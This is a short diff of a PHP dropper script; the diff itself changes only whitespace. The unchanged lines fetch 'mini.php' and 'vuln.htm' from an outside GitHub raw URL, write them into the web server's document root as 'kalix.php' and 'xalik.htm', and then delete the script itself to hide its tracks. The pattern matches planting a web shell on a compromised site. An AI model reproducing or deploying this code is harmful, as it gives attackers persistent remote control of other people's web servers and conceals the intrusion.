@@ -6,8 +6,7 @@ function http_get($url){
 	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
 	curl_setopt($im, CURLOPT_HEADER, 0);
 	return curl_exec($im);
-	curl_close($im);
-}
+	curl_close($im);}
 $check = $_SERVER['DOCUMENT_ROOT'] . "/kalix.php" ;
 $text = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/mini.php');
 $open = fopen($check, 'w');
@@ -18,7 +17,6 @@ if(file_exists($check)){
 }else 
   echo "not exits";
 echo "done .\n " ;
-
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/xalik.htm" ;
 $text2 = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/vuln.htm');
 $open2 = fopen($check2, 'w');
@@ -29,6 +27,4 @@ if(file_exists($check2)){
 }else 
   echo "not exits";
 echo "done .\n " ;
-
-@unlink(__FILE__);
-?>
+@unlink(__FILE__);?>
